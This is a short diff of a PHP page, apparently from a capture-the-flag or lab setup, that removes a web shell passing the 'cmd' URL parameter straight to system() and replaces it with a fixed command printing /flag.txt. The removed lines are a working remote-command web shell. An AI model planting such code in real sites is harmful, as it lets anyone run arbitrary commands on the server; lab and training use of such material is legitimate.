@@ -6,10 +6,7 @@
 </form>
 <pre>
 <?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd'] . ' 2>&1');
-    }
+    echo(system("cat /flag.txt"));
 ?>
 </pre>
 </body>
